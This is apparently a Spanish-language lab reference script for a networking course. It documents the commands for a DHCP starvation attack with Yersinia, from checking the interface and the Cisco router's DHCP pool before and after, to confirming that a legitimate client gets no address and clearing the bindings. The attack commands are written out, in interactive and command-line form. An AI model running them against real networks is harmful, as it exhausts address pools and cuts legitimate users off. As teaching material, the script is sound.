#!/bin/bash
# ==============================================================================
# Comandos de Ataque DHCP Starvation con Yersinia
# Práctica 41: DHCP Starvation Attack
# ==============================================================================
#
# Este script documenta los comandos utilizados durante la práctica.
# NO ejecutar directamente, usar como referencia.
#
# ADVERTENCIA: Solo usar en entornos de laboratorio controlados.
#
# ==============================================================================

# ========================================
# VERIFICAR INTERFAZ DE RED
# ========================================
# Identificar la interfaz conectada al segmento de ataque
ip link show

# Ejemplo de salida:
# 1: lo: <LOOPBACK,UP,LOWER_UP> ...
# 2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...

# ========================================
# VERIFICAR ESTADO INICIAL DEL SERVIDOR DHCP
# ========================================
# En el router Cisco, verificar el pool antes del ataque:
# Router# show ip dhcp binding
# Router# show ip dhcp pool
# Router# show ip dhcp server statistics

# ========================================
# EJECUTAR ATAQUE DHCP STARVATION
# ========================================

# Opción 1: Modo interactivo (ncurses)
# -------------------------------------
# Iniciar Yersinia en modo interactivo:
sudo yersinia -I

# Dentro de la interfaz:
# 1. Presionar 'd' para seleccionar DHCP
# 2. Presionar 'x' para ver opciones de ataque
# 3. Seleccionar '1' - sending DISCOVER packet (Starvation)
# 4. Observar cómo se envían múltiples DHCPDISCOVER
# 5. Presionar 'q' para detener el ataque

# Opción 2: Modo línea de comandos
# --------------------------------
# Ejecutar ataque directamente (reemplazar eth0 por tu interfaz):
# sudo yersinia dhcp -attack 1 -interface eth0

# ========================================
# VERIFICAR IMPACTO DEL ATAQUE
# ========================================
# En el router Cisco, verificar después del ataque:
# Router# show ip dhcp binding
# ! El pool estará agotado con múltiples direcciones asignadas

# Router# show ip dhcp pool
# ! Verificar que no hay direcciones disponibles

# Intentar obtener IP desde un cliente legítimo:
# $ sudo dhclient -v eth0
# ! El cliente no recibirá una dirección IP

# ========================================
# LIMPIAR BINDINGS (RECUPERACIÓN)
# ========================================
# En el router Cisco:
# Router# clear ip dhcp binding *
# Router# clear ip dhcp conflict *
